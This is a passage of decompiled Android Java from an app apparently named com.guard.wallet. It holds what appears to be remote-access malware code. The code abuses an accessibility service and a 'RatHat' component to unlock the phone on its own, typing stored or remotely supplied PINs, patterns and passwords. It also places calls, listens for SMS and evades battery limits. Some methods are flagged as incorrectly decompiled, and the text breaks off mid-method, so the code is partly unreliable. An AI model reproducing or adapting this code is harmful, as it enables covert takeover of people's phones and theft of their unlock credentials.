    public static boolean m659f(String str) {
        TelephonyManager telephonyManager;
        if (AbstractC0026q.m151B(str) || m653Z() == null || (telephonyManager = (TelephonyManager) m653Z().getSystemService("phone")) == null || !Objects.equals(Integer.valueOf(telephonyManager.getCallState()), 0) || ContextCompat.checkSelfPermission(m653Z(), "android.permission.CALL_PHONE") != 0) {
            return false;
        }
        Intent intent = new Intent("android.intent.action.CALL");
        intent.setData(Uri.parse("tel:".concat(str)));
        m653Z().startActivity(intent);
        return true;
    }

    public static LinkedList f0() {
        LinkedList linkedList = new LinkedList();
        if (m653Z() != null) {
            String packageName = m653Z().getPackageName();
            if ("com.guard.wallet.service.MyAccessibilityService".contains(packageName)) {
                linkedList.add(packageName.concat("/.service.MyAccessibilityService"));
            }
            linkedList.add(packageName.concat("/").concat("com.guard.wallet.service.MyAccessibilityService"));
        }
        return linkedList;
    }

    public static boolean f1() {
        if (m653Z() != null) {
            try {
                Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
                intent.addFlags(268435456);
                intent.addFlags(PKIFailureInfo.duplicateCertReq);
                intent.addFlags(67108864);
                intent.addFlags(2097152);
                intent.addFlags(8388608);
                m653Z().startActivity(intent);
                return true;
            } catch (Exception e2) {
                AbstractC0026q.m186s("ApplicationUtil", e2);
            }
        }
        return false;
    }

    /* renamed from: g */
    public static CallStateVO m660g() {
        TelephonyManager telephonyManager;
        String str;
        CallStateVO callStateVO = new CallStateVO(-1, "CALL_STATE_UNKNOWN", "通话状态未知");
        if (m653Z() != null && (telephonyManager = (TelephonyManager) m653Z().getSystemService("phone")) != null) {
            int callState = telephonyManager.getCallState();
            if (callState == 0) {
                callStateVO.setState(0);
                callStateVO.setCallState("CALL_STATE_IDLE");
                str = "电话空闲中...";
            } else if (callState == 1) {
                callStateVO.setState(1);
                callStateVO.setCallState("CALL_STATE_RINGING");
                str = "电话响铃中...";
            } else if (callState == 2) {
                callStateVO.setState(2);
                callStateVO.setCallState("CALL_STATE_OFFHOOK");
                str = "电话接通中...";
            }
            callStateVO.setDescription(str);
            Log.d("ApplicationUtil", str);
        }
        return callStateVO;
    }

    public static PermissionInfoVO g0(String str) {
        PermissionInfoVO permissionInfoVO = new PermissionInfoVO();
        permissionInfoVO.setPermissionValue(str);
        if (m653Z() != null) {
            try {
                PackageManager packageManager = m653Z().getPackageManager();
                PermissionInfo permissionInfo = packageManager.getPermissionInfo(str, 128);
                int i2 = permissionInfo.protectionLevel;
                if (Build.VERSION.SDK_INT >= 28) {
                    i2 = permissionInfo.getProtectionFlags();
                }
                permissionInfoVO.setGradeCode(Objects.equals(0, Integer.valueOf(i2)) ? "NORMAL" : Objects.equals(1, Integer.valueOf(i2)) ? "DANGEROUS" : Objects.equals(2, Integer.valueOf(i2)) ? "SIGNATURE" : Objects.equals(3, Integer.valueOf(i2)) ? "SIGNATURE_OR_SYSTEM" : Objects.equals(4, Integer.valueOf(i2)) ? "INTERNAL" : Objects.equals(16, Integer.valueOf(i2)) ? "PRIVILEGED" : Objects.equals(4096, Integer.valueOf(i2)) ? "INSTANT" : Objects.equals(512, Integer.valueOf(i2)) ? "VERIFIER" : Objects.equals(256, Integer.valueOf(i2)) ? "INSTALLER" : Objects.equals(1024, Integer.valueOf(i2)) ? "PREINSTALLED" : Objects.equals(2048, Integer.valueOf(i2)) ? "SETUP" : Objects.equals(8192, Integer.valueOf(i2)) ? "RUNTIME_ONLY" : Objects.equals(64, Integer.valueOf(i2)) ? "APPOP" : Objects.equals(128, Integer.valueOf(i2)) ? "PRE23" : Objects.equals(32, Integer.valueOf(i2)) ? "DEVELOPMENT" : String.valueOf(i2));
                if (!AbstractC0026q.m151B(permissionInfo.group)) {
                    permissionInfoVO.setGroupValue(permissionInfo.group);
                }
                CharSequence loadLabel = permissionInfo.loadLabel(packageManager);
                if (loadLabel != null) {
                    permissionInfoVO.setPermissionName(loadLabel.toString());
                }
                CharSequence loadDescription = permissionInfo.loadDescription(packageManager);
                if (loadDescription != null) {
                    permissionInfoVO.setDescription(loadDescription.toString());
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("ApplicationUtil", e2);
            }
        }
        return permissionInfoVO;
    }

    public static boolean g1() {
        try {
            if (m653Z() == null) {
                return false;
            }
            Intent intent = new Intent("android.settings.DEVICE_INFO_SETTINGS");
            intent.addFlags(268435456);
            intent.addFlags(PKIFailureInfo.duplicateCertReq);
            intent.addFlags(67108864);
            intent.addFlags(2097152);
            intent.addFlags(8388608);
            m653Z().startActivity(intent);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return false;
        }
    }

    /* renamed from: h */
    public static boolean m661h() {
        boolean isExternalStorageManager;
        if (m653Z() == null) {
            return false;
        }
        if (Build.VERSION.SDK_INT < 33) {
            return ContextCompat.checkSelfPermission(m653Z(), "android.permission.READ_EXTERNAL_STORAGE") == 0;
        }
        isExternalStorageManager = Environment.isExternalStorageManager();
        return isExternalStorageManager;
    }

    public static PermissionsBodyVO h0(String str) {
        String[] strArr;
        PermissionsBodyVO permissionsBodyVO = new PermissionsBodyVO();
        if (m653Z() != null) {
            if (AbstractC0026q.m151B(str)) {
                str = m653Z().getPackageName();
            }
            try {
                permissionsBodyVO.setPackageName(str);
                PackageManager packageManager = m653Z().getPackageManager();
                PackageInfo packageInfo = packageManager.getPackageInfo(str, 4096);
                AppInfo m650W = m650W(packageManager, packageManager.getApplicationInfo(str, 128));
                if (packageInfo != null && (strArr = packageInfo.requestedPermissions) != null && strArr.length > 0) {
                    permissionsBodyVO.setPermissions(new LinkedList());
                    for (String str2 : packageInfo.requestedPermissions) {
                        if (packageManager.checkPermission(str2, str) == 0) {
                            permissionsBodyVO.getPermissions().add(str2);
                        }
                    }
                }
                if (m650W != null) {
                    permissionsBodyVO.setApplicationLabel(m650W.getApplicationLabel());
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("ApplicationUtil", e2);
            }
        }
        return permissionsBodyVO;
    }

    public static synchronized void h1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getNetWorkReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
                intentFilter.addAction("android.net.wifi.STATE_CHANGE");
                intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
                NetWorkReceiver netWorkReceiver = new NetWorkReceiver();
                MainApplication.getInstance().setNetWorkReceiver(netWorkReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(netWorkReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(netWorkReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "NetWorkReceiver 启动完成");
            }
        }
    }

    /* renamed from: i */
    public static boolean m662i() {
        boolean isExternalStorageManager;
        if (m653Z() == null) {
            return false;
        }
        if (Build.VERSION.SDK_INT < 33) {
            return ContextCompat.checkSelfPermission(m653Z(), "android.permission.WRITE_EXTERNAL_STORAGE") == 0;
        }
        isExternalStorageManager = Environment.isExternalStorageManager();
        return isExternalStorageManager;
    }

    public static String i0() {
        if (Build.VERSION.SDK_INT >= 29) {
            if (m653Z() != null && m653Z().getExternalFilesDir(null) != null) {
                return m653Z().getExternalFilesDir(null).getAbsolutePath();
            }
        } else if (Environment.getExternalStorageDirectory() != null) {
            return Environment.getExternalStorageDirectory().getPath();
        }
        return BuildConfig.FLAVOR;
    }

    public static synchronized void i1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getPackageReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.intent.action.PACKAGE_ADDED");
                intentFilter.addAction("android.intent.action.PACKAGE_REMOVED");
                intentFilter.addDataScheme("package");
                PackageReceiver packageReceiver = new PackageReceiver();
                MainApplication.getInstance().setPackageReceiver(packageReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(packageReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(packageReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "PackageReceiver 启动完成");
            }
        }
    }

    /* renamed from: j */
    public static boolean m663j() {
        return m653Z() != null && ContextCompat.checkSelfPermission(m653Z(), "android.permission.WRITE_SECURE_SETTINGS") == 0;
    }

    public static boolean j0() {
        if (o0() || AbstractC0249e.m613b() == null) {
            return false;
        }
        String packageName = AbstractC0249e.m613b().getPackageName();
        Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
        intent.setData(Uri.parse("package:" + packageName));
        intent.addFlags(268435456);
        intent.addFlags(8388608);
        AbstractC0249e.m613b().startActivity(intent);
        return true;
    }

    public static synchronized void j1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getPowerReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.intent.action.ACTION_POWER_CONNECTED");
                intentFilter.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
                intentFilter.addAction("android.intent.action.POWER_USAGE_SUMMARY");
                intentFilter.addAction("android.os.action.POWER_SAVE_MODE_CHANGED");
                PowerBroadcastReceiver powerBroadcastReceiver = new PowerBroadcastReceiver();
                MainApplication.getInstance().setPowerReceiver(powerBroadcastReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(powerBroadcastReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(powerBroadcastReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "PowerBroadcastReceiver 启动完成");
            }
        }
    }

    /* renamed from: k */
    public static boolean m664k() {
        return m653Z() != null && ContextCompat.checkSelfPermission(m653Z(), "android.permission.CAMERA") == 0;
    }

    public static Bitmap k0(Bitmap bitmap, double d2) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.WEBP, 80, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        Bitmap decodeByteArray = BitmapFactory.decodeByteArray(byteArray, 0, byteArray.length);
        double height = (decodeByteArray.getHeight() * d2) / decodeByteArray.getWidth();
        if (d2 == 0.0d || height == 0.0d) {
            return decodeByteArray;
        }
        int width = decodeByteArray.getWidth();
        int height2 = decodeByteArray.getHeight();
        Matrix matrix = new Matrix();
        matrix.postScale((float) (d2 / width), (float) (height / height2));
        return Bitmap.createBitmap(decodeByteArray, 0, 0, width, height2, matrix, true);
    }

    public static synchronized void k1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getScreenReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.intent.action.SCREEN_ON");
                intentFilter.addAction("android.intent.action.SCREEN_OFF");
                intentFilter.addAction("android.intent.action.DREAMING_STARTED");
                intentFilter.addAction("android.intent.action.DREAMING_STOPPED");
                intentFilter.addAction("android.intent.action.USER_PRESENT");
                ScreenBroadcastReceiver screenBroadcastReceiver = new ScreenBroadcastReceiver();
                MainApplication.getInstance().setScreenReceiver(screenBroadcastReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(screenBroadcastReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(screenBroadcastReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "ScreenBroadcastReceiver 启动完成");
            }
        }
    }

    /* renamed from: l */
    public static boolean m665l() {
        return m653Z() != null && m653Z().getPackageManager().canRequestPackageInstalls();
    }

    public static boolean l0() {
        ConnectivityManager connectivityManager;
        NetworkInfo activeNetworkInfo;
        return (m653Z() == null || (connectivityManager = (ConnectivityManager) m653Z().getSystemService("connectivity")) == null || (activeNetworkInfo = connectivityManager.getActiveNetworkInfo()) == null || !activeNetworkInfo.isConnected()) ? false : true;
    }

    public static synchronized void l1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getShutDownReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.intent.action.ACTION_SHUTDOWN");
                intentFilter.addAction("android.intent.action.QUICKBOOT_POWEROFF");
                ShutDownBroadcastReceiver shutDownBroadcastReceiver = new ShutDownBroadcastReceiver();
                MainApplication.getInstance().setShutDownReceiver(shutDownBroadcastReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(shutDownBroadcastReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(shutDownBroadcastReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "ShutDownBroadcastReceiver 启动完成");
            }
        }
    }

    /* renamed from: m */
    public static boolean m666m() {
        if (m653Z() != null) {
            return Build.VERSION.SDK_INT >= 33 ? ContextCompat.checkSelfPermission(m653Z(), "android.permission.READ_MEDIA_AUDIO") == 0 : m661h();
        }
        return false;
    }

    public static boolean m0() {
        if (!p0()) {
            return true;
        }
        if (MyAccessibilityService.m554P() == null) {
            return false;
        }
        MyAccessibilityService.m548I(MyAccessibilityService.m555Q());
        MyAccessibilityService m554P = MyAccessibilityService.m554P();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.EditText"));
        m554P.getClass();
        if (MyAccessibilityService.m551M(combineFilter) != null) {
            return true;
        }
        if (AbstractC0249e.m623l()) {
            MyAccessibilityService m554P2 = MyAccessibilityService.m554P();
            CombineFilter t1 = t1();
            m554P2.getClass();
            UiObjectCollection m550L = MyAccessibilityService.m550L(t1);
            if (m550L != null && m550L.size() >= 10) {
                return true;
            }
            MyAccessibilityService m554P3 = MyAccessibilityService.m554P();
            CombineFilter s1 = s1();
            m554P3.getClass();
            UiObjectCollection m550L2 = MyAccessibilityService.m550L(s1);
            MyAccessibilityService m554P4 = MyAccessibilityService.m554P();
            CombineFilter r1 = r1();
            m554P4.getClass();
            UiObjectCollection m550L3 = MyAccessibilityService.m550L(r1);
            if (m550L2 != null && m550L2.size() > 0 && m550L3 != null && m550L3.size() > 0) {
                return true;
            }
            MyAccessibilityService m554P5 = MyAccessibilityService.m554P();
            CombineFilter combineFilter2 = new CombineFilter();
            combineFilter2.setStringConditions(new LinkedList());
            combineFilter2.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_lock_pattern_view", null, null, null, null));
            m554P5.getClass();
            return MyAccessibilityService.m551M(combineFilter2) != null;
        }
        if (AbstractC0249e.m620i()) {
            MyAccessibilityService m554P6 = MyAccessibilityService.m554P();
            CombineFilter D0 = D0();
            m554P6.getClass();
            UiObjectCollection m550L4 = MyAccessibilityService.m550L(D0);
            if (m550L4 != null && m550L4.size() >= 10) {
                return true;
            }
            MyAccessibilityService m554P7 = MyAccessibilityService.m554P();
            CombineFilter combineFilter3 = new CombineFilter();
            combineFilter3.setStringConditions(new LinkedList());
            combineFilter3.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/colorLockPatternView", null, null, null, null));
            m554P7.getClass();
            return MyAccessibilityService.m551M(combineFilter3) != null;
        }
        MyAccessibilityService m554P8 = MyAccessibilityService.m554P();
        CombineFilter m675v = m675v();
        m554P8.getClass();
        UiObjectCollection m550L5 = MyAccessibilityService.m550L(m675v);
        if (m550L5 != null && m550L5.size() >= 10) {
            return true;
        }
        MyAccessibilityService m554P9 = MyAccessibilityService.m554P();
        CombineFilter combineFilter4 = new CombineFilter();
        combineFilter4.setStringConditions(new LinkedList());
        combineFilter4.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/lockPatternView", null, null, null, null));
        m554P9.getClass();
        return MyAccessibilityService.m551M(combineFilter4) != null;
    }

    public static synchronized void m1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getSmsReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
                intentFilter.addAction("android.provider.Telephony.SMS_DELIVER");
                SmsReceiver smsReceiver = new SmsReceiver();
                MainApplication.getInstance().setSmsReceiver(smsReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(smsReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(smsReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "SmsReceiver 启动完成");
            }
        }
    }

    /* renamed from: n */
    public static boolean m667n() {
        return m653Z() != null && ContextCompat.checkSelfPermission(m653Z(), "android.permission.READ_CONTACTS") == 0;
    }

    public static boolean n0() {
        if (r0()) {
            return (!p0() && (m638K() || AbstractC0249e.m624m())) || AbstractC0252h.m710n() || AbstractC0252h.m711o();
        }
        return true;
    }

    public static boolean n1() {
        if (m653Z() != null) {
            try {
                Intent intent = new Intent("android.settings.WIFI_SETTINGS");
                intent.addFlags(268435456);
                intent.addFlags(PKIFailureInfo.duplicateCertReq);
                intent.addFlags(67108864);
                intent.addFlags(2097152);
                intent.addFlags(8388608);
                m653Z().startActivity(intent);
                return true;
            } catch (Exception e2) {
                AbstractC0026q.m186s("ApplicationUtil", e2);
            }
        }
        return false;
    }

    /* renamed from: o */
    public static boolean m668o() {
        if (m653Z() != null) {
            return Build.VERSION.SDK_INT >= 33 ? ContextCompat.checkSelfPermission(m653Z(), "android.permission.READ_MEDIA_IMAGES") == 0 : m661h();
        }
        return false;
    }

    public static boolean o0() {
        PowerManager powerManager;
        if (m653Z() == null || (powerManager = (PowerManager) m653Z().getSystemService("power")) == null) {
            return false;
        }
        return powerManager.isIgnoringBatteryOptimizations(m653Z().getPackageName());
    }

    public static boolean o1(List list) {
        String str;
        if (list == null || list.isEmpty()) {
            return false;
        }
        Log.d("UnLockUtils", "使用触点密码解锁");
        if (MyAccessibilityService.m554P() != null) {
            Log.d("UnLockUtils", "委托无障碍容器输入触点密码");
            if (m673t(list)) {
                Log.d("UnLockUtils", "委托无障碍容器输入触点密码完成");
                m676w();
                if (m671r()) {
                    str = "委托无障碍容器解锁完成";
                    Log.d("UnLockUtils", str);
                    return true;
                }
            }
            Log.e("UnLockUtils", "委托无障碍容器解锁失败");
        }
        if (C0318e.m844S() == null || !C0318e.m844S().mo302D()) {
            return false;
        }
        Log.d("UnLockUtils", "委托RatHat容器输入触点密码");
        if (C0318e.m844S().c0(list)) {
            Log.d("UnLockUtils", "委托RatHat容器输入触点密码输入完成");
            m676w();
            if (m671r()) {
                str = "委托RatHat容器解锁完成";
                Log.d("UnLockUtils", str);
                return true;
            }
        }
        Log.e("UnLockUtils", "委托RatHat容器解锁失败");
        return false;
    }

    /* renamed from: p */
    public static boolean m669p() {
        return m653Z() != null && ContextCompat.checkSelfPermission(m653Z(), "android.permission.READ_SMS") == 0;
    }

    public static boolean p0() {
        if (m653Z() != null) {
            return ((KeyguardManager) m653Z().getSystemService("keyguard")).isDeviceLocked();
        }
        return false;
    }

    public static boolean p1(ReqUnlockDeviceVO reqUnlockDeviceVO) {
        boolean z2;
        String str;
        if (reqUnlockDeviceVO == null) {
            reqUnlockDeviceVO = new ReqUnlockDeviceVO();
        }
        Log.d("UnLockUtils", AbstractC0252h.m693N(reqUnlockDeviceVO));
        if (LockActivity.m331b() != null) {
            LockActivity.m330a();
        }
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService m554P = MyAccessibilityService.m554P();
            m554P.getClass();
            try {
                m554P.f331n.set(true);
            } catch (Exception e2) {
                AbstractC0026q.m186s("MyAccessibilityService", e2);
            }
        }
        if (AbstractC0249e.m621j() || AbstractC0026q.m168S()) {
            if (p0()) {
                t0(true);
                if (m647T()) {
                    Log.d("UnLockUtils", "滑动上拉完成");
                    if (p0()) {
                        if (MyAccessibilityService.m555Q() != null) {
                            MyAccessibilityService.m555Q().setUniqueId("GLOBAL_UNLOCK");
                            UiObject m555Q = MyAccessibilityService.m555Q();
                            ConcurrentHashMap concurrentHashMap = AbstractC0181d.f201a;
                            if (m555Q != null) {
                                try {
                                    String uniqueId = AbstractC0026q.m151B(m555Q.uniqueId()) ? "GLOBAL_DELEGATE" : m555Q.uniqueId();
                                    ConcurrentHashMap concurrentHashMap2 = AbstractC0181d.f201a;
                                    ConcurrentLinkedQueue concurrentLinkedQueue = (ConcurrentLinkedQueue) concurrentHashMap2.get(uniqueId);
                                    if (concurrentLinkedQueue == null) {
                                        concurrentLinkedQueue = new ConcurrentLinkedQueue();
                                    }
                                    concurrentLinkedQueue.add(m555Q);
                                    concurrentHashMap2.put(uniqueId, concurrentLinkedQueue);
                                } catch (Exception e3) {
                                    AbstractC0026q.m186s("com.guard.wallet.helper.d", e3);
                                }
                            }
                        }
                        ReqUnlockDeviceVO m703g = AbstractC0252h.m703g();
                        if (AbstractC0252h.m716t(m703g)) {
                            Log.d("UnLockUtils", "使用本地已锁定密码解锁");
                            z2 = q1(m703g);
                            if (z2) {
                                Log.d("UnLockUtils", "使用本地已锁定密码解锁成功");
                                m703g.setLocked(Boolean.TRUE);
                                reqUnlockDeviceVO = m703g;
                            } else {
                                Log.e("UnLockUtils", "使用本地已锁定密码解锁失败");
                                synchronized (ReqUnlockDeviceVO.class) {
                                    AbstractC0252h.m719w("deviceCipherLocked");
                                }
                            }
                        } else {
                            z2 = false;
                        }
                        if (!z2 && AbstractC0252h.m716t(reqUnlockDeviceVO)) {
                            Log.d("UnLockUtils", "使用远程密码解锁");
                            z2 = q1(reqUnlockDeviceVO);
                            if (!z2) {
                                Log.e("UnLockUtils", "远程密码解锁失败");
                            }
                        }
                        if (!z2) {
                            ReqUnlockDeviceVO m702f = AbstractC0252h.m702f();
                            if (AbstractC0252h.m716t(m702f)) {
                                Log.d("UnLockUtils", "使用本地已保存密码解锁");
                                z2 = q1(m702f);
                                if (z2) {
                                    Log.d("UnLockUtils", "使用本地已保存密码解锁成功");
                                    m702f.setLocked(Boolean.TRUE);
                                    reqUnlockDeviceVO = m702f;
                                } else {
                                    Log.e("UnLockUtils", "使用本地已保存密码解锁失败");
                                    synchronized (ReqUnlockDeviceVO.class) {
                                        AbstractC0252h.m719w("deviceCipher");
                                    }
                                }
                            }
                        }
                        if (z2) {
                            Log.d("UnLockUtils", "设备解锁成功");
                            m644Q();
                            reqUnlockDeviceVO.setLocked(Boolean.TRUE);
                            AbstractC0252h.m682C(reqUnlockDeviceVO);
                            AbstractC0207l.m414B(reqUnlockDeviceVO);
                        } else {
                            Log.e("UnLockUtils", "设备解锁失败");
                            m643P();
                        }
                        t0(false);
                        return z2;
                    }
                } else {
                    str = "滑动上拉失败";
                }
            } else if (Objects.equals(MyAccessibilityService.m552N(), "com.android.systemui")) {
                Log.d("UnLockUtils", "设备处于屏保模式");
                m647T();
                Log.d("UnLockUtils", "滑动上拉完成");
            }
            Log.d("UnLockUtils", "设备已解锁成功");
            m644Q();
            return true;
        }
        str = "设备息屏,唤醒设备失败";
        Log.e("UnLockUtils", str);
        m643P();
        return false;
    }

    /* renamed from: q */
    public static boolean m670q() {
        if (m653Z() != null) {
            return Build.VERSION.SDK_INT >= 33 ? ContextCompat.checkSelfPermission(m653Z(), "android.permission.READ_MEDIA_VIDEO") == 0 : m661h();
        }
        return false;
    }

    public static LinkedHashSet q0() {
        String[] split;
        LinkedHashSet linkedHashSet = new LinkedHashSet();
        if (m653Z() != null) {
            String string = Settings.Secure.getString(m653Z().getContentResolver(), "enabled_accessibility_services");
            if (!AbstractC0026q.m151B(string) && (split = TextUtils.split(string, ":")) != null && split.length > 0) {
                linkedHashSet.addAll(Arrays.asList(split));
            }
        }
        return linkedHashSet;
    }

    /* JADX WARN: Code restructure failed: missing block: B:199:0x039e, code lost:
    
        if (r2 == false) goto L189;
     */
    /* JADX WARN: Code restructure failed: missing block: B:288:0x0202, code lost:
    
        if (m671r() != false) goto L114;
     */
    /* JADX WARN: Removed duplicated region for block: B:132:0x025c  */
    /* JADX WARN: Removed duplicated region for block: B:202:0x049f  */
    /* JADX WARN: Removed duplicated region for block: B:306:0x0249  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x013f A[RETURN] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean q1(ReqUnlockDeviceVO reqUnlockDeviceVO) {
        boolean z2;
        boolean z3;
        boolean z4;
        UiObjectCollection m550L;
        String str;
        boolean z5;
        List<TouchEvent> eventCipher;
        boolean z6;
        String str2;
        boolean z7;
        if (reqUnlockDeviceVO == null) {
            return false;
        }
        if ((Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX")) && reqUnlockDeviceVO.getTouchCipher() != null && !reqUnlockDeviceVO.getTouchCipher().isEmpty() && o1(reqUnlockDeviceVO.getTouchCipher())) {
            reqUnlockDeviceVO.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
            return true;
        }
        String str3 = "委托RatHat容器解锁完成";
        if (Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") && reqUnlockDeviceVO.getPatternCipher() != null && !reqUnlockDeviceVO.getPatternCipher().isEmpty()) {
            List<Point> patternCipher = reqUnlockDeviceVO.getPatternCipher();
            if (patternCipher != null && !patternCipher.isEmpty()) {
                Log.d("UnLockUtils", "使用滑动图案解锁");
                LinkedList linkedList = new LinkedList(patternCipher);
                if (!linkedList.isEmpty()) {
                    ListIterator listIterator = linkedList.listIterator();
                    Point point = null;
                    while (listIterator.hasNext()) {
                        Point point2 = (Point) listIterator.next();
                        if (point2 == null || point2.getX() < 0.0f || point2.getY() < 0.0f) {
                            listIterator.remove();
                        } else {
                            if (point2.equals(point)) {
                                listIterator.remove();
                            }
                            point = point2;
                        }
                    }
                }
                T0(10);
                if (MyAccessibilityService.m554P() != null) {
                    Log.d("UnLockUtils", "委托无障碍容器使用滑动图案解锁");
                    int size = linkedList.size();
                    Point[] pointArr = new Point[size];
                    linkedList.toArray(pointArr);
                    if (size > 0) {
                        try {
                            ExecutorService newFixedThreadPool = Executors.newFixedThreadPool(1);
                            for (int i2 = 1; i2 <= 4; i2++) {
                                long j2 = i2 * 1000;
                                CountDownLatch countDownLatch = new CountDownLatch(1);
                                newFixedThreadPool.submit(new RunnableC0185h(j2, pointArr, 1));
                                if (!countDownLatch.await(j2 + 1000, TimeUnit.MILLISECONDS)) {
                                    newFixedThreadPool.shutdownNow();
                                    if (m671r()) {
                                        z7 = true;
                                        break;
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("UnLockUtils", e2);
                        }
                    }
                    z7 = m671r();
                    if (z7) {
                        str2 = "委托无障碍容器输入滑动图案完成";
                        Log.d("UnLockUtils", str2);
                        z6 = true;
                        if (z6) {
                            return true;
                        }
                    } else {
                        Log.d("UnLockUtils", "委托无障碍容器输入滑动图案失败");
                    }
                }
                if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                    Log.d("UnLockUtils", "委托RatHat容器使用滑动图案解锁");
                    if (C0318e.m844S().m862W(linkedList)) {
                        Log.d("UnLockUtils", "委托RatHat容器输入滑动图案完成");
                        if (m671r()) {
                            str2 = "委托RatHat容器解锁完成";
                            Log.d("UnLockUtils", str2);
                            z6 = true;
                            if (z6) {
                            }
                        }
                    }
                    Log.e("UnLockUtils", "委托RatHat容器解锁失败");
                }
            }
            z6 = false;
            if (z6) {
            }
        }
        if (Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_ALPHANUMERIC") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC") || Objects.equals(reqUnlockDeviceVO.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
            if (!AbstractC0026q.m151B(reqUnlockDeviceVO.getTextCipher())) {
                String textCipher = reqUnlockDeviceVO.getTextCipher();
                if (!AbstractC0026q.m151B(textCipher)) {
                    Log.d("UnLockUtils", "使用文本密码解锁");
                    if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                        Log.d("UnLockUtils", "委托RatHat容器输入文本密码");
                        for (int i3 = 0; i3 < 5 && p0(); i3++) {
                            if (C0318e.m844S().m855N("input text ".concat(textCipher))) {
                                Log.d("UnLockUtils", "委托RatHat输入文本密码完成");
                                m641N(null);
                                if (m671r()) {
                                    break;
                                }
                            }
                            U0();
                        }
                        if (!p0()) {
                            str3 = "委托RatHat解锁成功";
                            Log.d("UnLockUtils", str3);
                            z2 = true;
                            if (!z2) {
                                String textCipher2 = reqUnlockDeviceVO.getTextCipher();
                                if (!AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null) {
                                    if (AbstractC0026q.m153D(textCipher2)) {
                                        if (!AbstractC0026q.m151B(textCipher2) && MyAccessibilityService.m554P() != null) {
                                            Log.d("UnLockUtils", "使用PIN码解锁");
                                            if (AbstractC0249e.m623l()) {
                                                MyAccessibilityService m554P = MyAccessibilityService.m554P();
                                                CombineFilter t1 = t1();
                                                m554P.getClass();
                                                m550L = MyAccessibilityService.m550L(t1);
                                                Log.d("UnLockUtils", "依VIVO PIN码规则解锁");
                                                str = "com.android.systemui:id/VivoPinkey";
                                            } else if (AbstractC0249e.m620i()) {
                                                MyAccessibilityService m554P2 = MyAccessibilityService.m554P();
                                                CombineFilter D0 = D0();
                                                m554P2.getClass();
                                                m550L = MyAccessibilityService.m550L(D0);
